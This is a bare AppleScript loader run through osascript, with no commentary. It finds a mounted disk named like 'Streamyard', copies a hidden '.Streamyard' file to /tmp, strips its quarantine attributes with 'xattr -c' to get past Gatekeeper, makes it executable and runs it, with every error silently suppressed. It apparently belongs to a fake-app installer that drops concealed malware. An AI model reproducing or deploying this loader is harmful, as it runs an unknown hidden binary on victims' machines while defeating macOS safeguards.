osascript -e 'on run
    try
        set diskList to list disks
    end try
    set targetDisk to ""
    try
        repeat with disk in diskList
            if disk contains "Streamyard" then
                set targetDisk to disk
                exit repeat
            end if
        end repeat
    end try
    if targetDisk is "" then
        return
    end if
    set folderPath to "/Volumes/" & targetDisk & "/"
    set appName to ".Streamyard"
    set appPath to folderPath & appName
    set tempAppPath to "/tmp/" & appName
    try
        do shell script "rm -f " & quoted form of tempAppPath
    end try
    try
        do shell script "cp " & quoted form of appPath & " " & quoted form of tempAppPath
    end try
    try
        do shell script "xattr -c " & quoted form of tempAppPath
    end try
    try
        do shell script "chmod +x " & quoted form of tempAppPath
    end try
    try
        do shell script quoted form of tempAppPath
    end try
end run'

